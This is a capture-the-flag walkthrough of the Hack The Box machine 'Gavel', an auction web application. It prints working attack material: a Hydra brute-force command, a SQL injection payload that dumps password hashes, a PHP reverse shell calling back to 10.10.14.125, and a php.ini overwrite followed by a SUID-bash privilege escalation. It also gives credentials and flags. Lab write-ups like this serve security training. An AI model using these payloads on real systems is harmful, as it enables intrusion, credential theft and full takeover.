
## Flags
- User: 1a623c5784a6aab4fce19b536a239946
- Root: 4e91b73bd18dea7bc11e9da70b99d869

--- 

## Target Information
1. Users
	- sado:sado@gavel.htb
	- mysql -> gavel:gavel
	- auctioneer:midnight1

2. Machine
	- Ubuntu

---

## Services
1. SSH (22)
	- Version: OpenSSH 8.9p1 Ubuntu 3ubuntu0.13

2. HTTP (80)
	- Server: Apache/2.4.52
	- Domain: http://gavel.htb/
	- Language: PHP

---

## Web Application
### Enumeration

1. Pages Found
```
.git
login.php
register.php
bid_handler.php
.php
index.php
admin.php
assets/
rules/
includes/
logout.php
inventory.php
```

2. Purpose
- The web application is an auction platform for special items.
- It features `index.php`, `inventory.php`, and a bidding page.

---

### Git Repository
- A user named `sado` was found.
- The repository contains the entire application source code.

---

### Source Code Analysis

1. MySQL database credentials were found: `gavel:gavel`.

2. The string `auctioneer` is repeated in multiple places, suggesting it is a valid username. We attempted a brute-force attack using Hydra on the login form.

```bash
hydra -l auctioneer -P ../../SecLists/Passwords/Leaked-Databases/rockyou.txt gavel.htb http-post-form "/login.php:username=^USER^&password=^PASS^:S=302" -I
```

3. The password `midnight1` was successfully discovered.

4. After reviewing the source code, a possible SQL injection vulnerability was found in `inventory.php`:

```sql
SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC
```

5. From `login.php`, we learned that there is a table named `users` with the following columns:
`id`, `username`, `password`, `role`.

6. By combining this information, we can create a successful SQL injection payload.  
(The payload is not mine; credit goes to the author of this repository:  
https://github.com/Solrikk/HTB-Gavel-Writeup)

```sql
?user_id=x`+FROM+(SELECT+group_concat(username,0x3a,password)+AS+`%27x`+FROM+users)y;--+-&sort=\?;--+-%00
```

7. After successfully exploiting the SQL injection, we retrieved the following credentials:

```
auctioneer:$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RTfS
```

Cracking the hash using `hashcat` and `rockyou.txt` yields the password `midnight1`.

8. There are two possible attack paths: brute-force and SQL injection. The brute-force approach is the easiest, while the SQL injection technique is significantly more complex.

9. With access to the admin panel, we continued reviewing the source code.

10. We discovered that rules are transformed into PHP functions and executed using `runkit_function_add`.

11. We created a payload, submitted it as a rule, and triggered it via the bidding page.

```bash
$sock=fsockopen("10.10.14.125",9001);
$proc=proc_open("/bin/bash", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
```

---

## User Shell

1. A reverse shell was obtained as the `www-data` user.

2. Using `su - auctioneer` with the password `midnight1`, we successfully switched users and retrieved the user flag:

```
1a623c5784a6aab4fce19b536a239946
```

---
## Root Shell

1. A file named `invoice.txt` was found in `/`, suggesting the presence of a cron job or service.

2. The user belongs to the `gavel-seller` group. Running the following command:
```bash
find / -type f -group <groupname> -readable 2>/dev/null
```
revealed that we can read and execute `/usr/local/bin/gavel-util`.

5. The `gavel-util` binary allows adding new rules, but the PHP configuration file located at `/opt/gavel/.config/php/php.ini` prevents execution of functions such as `system`.

6. To bypass this restriction, we created a rule to overwrite the `php.ini` file:

```bash
echo "rule: file_put_contents('/opt/gavel/.config/php/php.ini', "engine=On\ndisplay_errors=On\nopen_basedir=\ndisable_functions=\n"); return false;" >> fix_ini.yaml
```

7. After waiting for the rule to be executed, we added another rule that copies `/bin/bash` into the `auctioneer` home directory and sets the SUID bit:

```bash
echo 'description: make suid bash' >> rootshell.yaml
echo 'image: "x.png"' >> rootshell.yaml
echo 'price: 1' >> rootshell.yaml
echo 'rule_msg: "rootshell"' >> rootshell.yaml
echo "rule: system('cp /bin/bash /home/auctioneer/bash; chmod u+s /home/auctioneer/bash'); return false;" >> rootshell.yaml
/usr/local/bin/gavel-util submit /home/auctioneer/rootshell.yaml
```

8. Executing the SUID bash binary allowed us to read `/root/root.txt` and retrieve the root flag:

```
4e91b73bd18dea7bc11e9da70b99d869
```

---